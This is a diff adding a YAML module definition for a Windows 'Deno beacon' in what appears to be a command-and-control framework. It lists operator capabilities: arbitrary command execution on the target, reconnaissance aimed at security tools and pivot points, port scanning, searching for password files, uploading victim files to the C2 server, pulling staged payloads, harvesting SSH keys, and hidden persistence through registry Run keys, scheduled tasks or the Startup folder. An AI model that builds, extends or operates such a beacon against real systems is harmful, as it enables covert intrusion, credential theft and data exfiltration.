@@ -1,0 +1,361 @@
+schema_version: '1.1'
+beacon_info:
+  beacon_type: deno_beacon
+  version: 1.0.0
+  description: Multi-stage Deno beacon for Windows. Stage 1 (cmd one-liner) installs Deno via script-based installers, stage 2 pulls this beacon from the C2, stage 3 runs it hidden with deno run -A.
+  supported_platforms:
+  - windows
+  encoding_strategy: plaintext
+  file_transfer_supported: true
+  keylogger_supported: false
+  supported_protocols:
+  - http
+categories:
+  basic_commands:
+    display_name: Basic Commands
+    description: Fundamental command execution capabilities
+    modules:
+      command_execution:
+        display_name: Command Execution
+        description: Execute arbitrary system commands
+        command_template: '{command}'
+        parameters:
+          command:
+            type: textarea
+            display_name: Command
+            description: Enter command to execute on the target system (via cmd.exe)
+            required: true
+            default: 'whoami'
+            validation:
+              min_length: 1
+              max_length: 8192
+        documentation:
+          content: Execute system commands directly on the target machine using cmd.exe with stdout and stderr capture. Batch/cmd syntax is supported.
+          examples:
+          - whoami
+          - dir C:\
+          - tasklist
+          - net user
+          - systeminfo
+        execution:
+          timeout: 300
+          requires_admin: false
+        ui:
+          layout: simple
+  discovery:
+    display_name: Discovery & Reconnaissance
+    description: System and network reconnaissance capabilities
+    modules:
+      system_info:
+        display_name: System Information
+        description: Gather comprehensive system information
+        command_template: 'execute_module|SystemInfo'
+        parameters: {}
+        documentation:
+          content: Collects hostname, current user, OS version, architecture, Deno/runtime versions, memory usage, working directory, and process IDs.
+          examples:
+          - Basic system enumeration
+          - Runtime fingerprinting
+        execution:
+          timeout: 60
+          requires_admin: false
+        ui:
+          layout: simple
+      process_enum:
+        display_name: Process Enumeration
+        description: Enumerate running processes on the system
+        command_template: 'execute_module|ProcessEnum'
+        parameters: {}
+        documentation:
+          content: Lists all running processes using tasklist /v with fallback to plain tasklist. Useful for identifying security tooling and situational awareness.
+          examples:
+          - Process discovery
+          - Identifying security tools
+        execution:
+          timeout: 60
+          requires_admin: false
+        ui:
+          layout: simple
+      network_enum:
+        display_name: Network Enumeration
+        description: Enumerate network interfaces and connections
+        command_template: 'execute_module|NetworkEnum'
+        parameters: {}
+        documentation:
+          content: Discovers network interfaces (ipconfig /all), active connections with owning PIDs (netstat -ano), and the ARP table.
+          examples:
+          - Network interface discovery
+          - Identifying pivot opportunities
+        execution:
+          timeout: 60
+          requires_admin: false
+        ui:
+          layout: simple
+      user_enum:
+        display_name: User Enumeration
+        description: Enumerate users and privileges
+        command_template: 'execute_module|UserEnum'
+        parameters: {}
+        documentation:
+          content: Enumerates the current user, their privileges and groups (whoami /all), local accounts (net user), and local groups (net localgroup). Useful for privilege escalation triage.
+          examples:
+          - User account discovery
+          - Privilege escalation target identification
+        execution:
+          timeout: 60
+          requires_admin: false
+        ui:
+          layout: simple
+      service_enum:
+        display_name: Service Enumeration
+        description: Enumerate system services
+        command_template: 'execute_module|ServiceEnum'
+        parameters: {}
+        documentation:
+          content: Lists all services and their states using sc query state= all with fallback to net start for running services.
+          examples:
+          - Service discovery
+          - Identifying vulnerable services
+        execution:
+          timeout: 60
+          requires_admin: false
+        ui:
+          layout: simple
+      environment_enum:
+        display_name: Environment Enumeration
+        description: Enumerate environment variables
+        command_template: 'execute_module|EnvironmentEnum'
+        parameters: {}
+        documentation:
+          content: Lists all environment variables visible to the beacon process (sorted). May reveal paths, proxy settings, and domain context.
+          examples:
+          - Environment variable discovery
+          - PATH enumeration for privilege escalation
+        execution:
+          timeout: 30
+          requires_admin: false
+        ui:
+          layout: simple
+  scanning:
+    display_name: Network Scanning
+    description: Network reconnaissance and scanning capabilities
+    modules:
+      port_scan:
+        display_name: Port Scanner
+        description: Scan target hosts for open ports
+        command_template: 'execute_module|PortScan|{target},{ports}'
+        parameters:
+          target:
+            type: text
+            display_name: Target IP/Hostname
+            description: Target IP address or hostname to scan
+            required: true
+            default: '127.0.0.1'
+            validation:
+              min_length: 3
+              max_length: 253
+          ports:
+            type: text
+            display_name: Ports (comma-separated)
+            description: Comma-separated list of ports to scan (e.g. 22,80,443,3389)
+            required: true
+            default: '22,80,443,3389'
+            validation:
+              min_length: 2
+              max_length: 1000
+        documentation:
+          content: Performs TCP connect scanning using Deno sockets with 3-second timeouts per port and simple open/closed status.
+          examples:
+          - '127.0.0.1,80,443,3389'
+          - '192.168.1.1,22,135,139,445'
+        execution:
+          timeout: 300
+          requires_admin: false
+        ui:
+          layout: simple
+      dns_enum:
+        display_name: DNS Enumeration
+        description: Enumerate DNS records for a domain
+        command_template: 'execute_module|DNSEnum|{domain}'
+        parameters:
+          domain:
+            type: text
+            display_name: Domain Name
+            description: Domain name to enumerate DNS records for
+            required: true
+            default: 'example.com'
+            validation:
+              min_length: 3
+              max_length: 253
+        documentation:
+          content: Resolves A, AAAA, CNAME, MX, NS, and TXT records using the system resolver via Deno.resolveDns.
+          examples:
+          - 'google.com'
+          - 'microsoft.com'
+        execution:
+          timeout: 120
+          requires_admin: false
+        ui:
+          layout: simple
+  file_operations:
+    display_name: File Operations
+    description: File system search and transfer capabilities
+    modules:
+      file_search:
+        display_name: File Search
+        description: Search for files matching a pattern
+        command_template: 'execute_module|FileSearch|{directory},{pattern}'
+        parameters:
+          directory:
+            type: directory
+            display_name: Search Directory
+            description: Directory to search in (recursively)
+            required: true
+            default: 'C:\\Users'
+            validation:
+              min_length: 2
+              max_length: 500
+          pattern:
+            type: text
+            display_name: Search Pattern
+            description: File name pattern to search for (case-insensitive substring match)
+            required: true
+            default: 'password'
+            validation:
+              min_length: 1
+              max_length: 100
+        documentation:
+          content: Recursively searches for files whose names contain the pattern (case-insensitive substring). Skips AppData, WinSxS and the recycle bin. Returns up to 100 results.
+          examples:
+          - 'C:\Users,password'
+          - 'C:\inetpub,config'
+          - 'C:\Temp,txt'
+        execution:
+          timeout: 300
+          requires_admin: false
+        ui:
+          layout: simple
+      download_file:
+        display_name: Download File to Beacon
+        description: Download a file from the C2 server to the beacon host
+        command_template: 'execute_module|DownloadFile|{filename}'
+        parameters:
+          filename:
+            type: text
+            display_name: Server Filename
+            description: Name of the file in the server's files directory to download
+            required: true
+            default: 'payload.txt'
+            validation:
+              min_length: 1
+              max_length: 255
+        documentation:
+          content: Uses the to_beacon file transfer command to pull a file from the C2 server's files directory and save it to the beacon's working directory. Reports download_complete or download_failed back to the server.
+          examples:
+          - 'payload.txt'
+          - 'stage4.exe'
+        execution:
+          timeout: 120
+          requires_admin: false
+        ui:
+          layout: simple
+      upload_file:
+        display_name: Upload File from Beacon
+        description: Upload a file from the beacon host to the C2 server
+        command_template: 'execute_module|UploadFile|{path}'
+        parameters:
+          path:
+            type: text
+            display_name: Local File Path
+            description: Full path of the file on the beacon to upload
+            required: true
+            default: 'C:\\Windows\\win.ini'
+            validation:
+              min_length: 3
+              max_length: 500
+        documentation:
+          content: Uses the from_beacon file transfer command to upload a file from the beacon host to the C2 server's files directory. The beacon streams the file bytes on the same HTTP connection after the initial command.
+          examples:
+          - 'C:\Windows\win.ini'
+          - 'C:\Users\Public\document.txt'
+        execution:
+          timeout: 300
+          requires_admin: false
+        ui:
+          layout: simple
+  credential_harvesting:
+    display_name: Credential Harvesting
+    description: Discover and analyze stored credentials and keys
+    modules:
+      ssh_key_discovery:
+        display_name: SSH Key Discovery
+        description: Discover SSH private keys, public keys, and configuration
+        command_template: 'execute_module|SSH_Discovery'
+        parameters: {}
+        documentation:
+          content: Scans the current user's profile and all C:\Users profiles for .ssh directories, listing keys, config, and known_hosts files.
+          examples:
+          - SSH key enumeration
+          - SSH configuration analysis
+        execution:
+          timeout: 60
+          requires_admin: false
+        ui:
+          layout: simple
+  persistence:
+    display_name: Persistence Mechanisms
+    description: Establish persistence across reboots
+    modules:
+      persistence:
+        display_name: Basic Persistence
+        description: Create persistence mechanisms
+        command_template: 'execute_module|Persistence|{method},{command}'
+        parameters:
+          method:
+            type: choice
+            display_name: Persistence Method
+            description: Method to use for persistence
+            required: true
+            default: 'registry'
+            choices:
+            - registry
+            - schtasks
+            - startup
+          command:
+            type: text
+            display_name: Command to Execute
+            description: Command to execute at logon (e.g. re-run the one-liner)
+            required: true
+            default: 'powershell -NoP -W Hidden -Command "echo beacon"'
+            validation:
+              min_length: 1
+              max_length: 1000
+        documentation:
+          content: 'Creates user-level persistence: registry (HKCU Run key), schtasks (logon scheduled task named DenoBeacon), or startup (batch script in the user Startup folder). No elevation required.'
+          examples:
+          - 'registry,powershell -NoP -W Hidden -Command "echo beacon"'
+          - 'schtasks,cmd /c whoami'
+        execution:
+          timeout: 60
+          requires_admin: false
+        ui:
+          layout: simple
+  maintenance:
+    display_name: Beacon Maintenance
+    description: Beacon control and cleanup operations
+    modules:
+      cleanup:
+        display_name: Cleanup & Shutdown
+        description: Stop beacon and perform cleanup
+        command_template: 'execute_module|Cleanup'
+        parameters: {}
+        documentation:
+          content: Stops the beacon process. A final status message is sent before the beacon terminates itself. Does not remove the Deno installation or persistence entries.
+          examples:
+          - Graceful beacon shutdown
+          - Emergency cleanup
+        execution:
+          timeout: 30
+          requires_admin: false
+        ui:
+          layout: simple
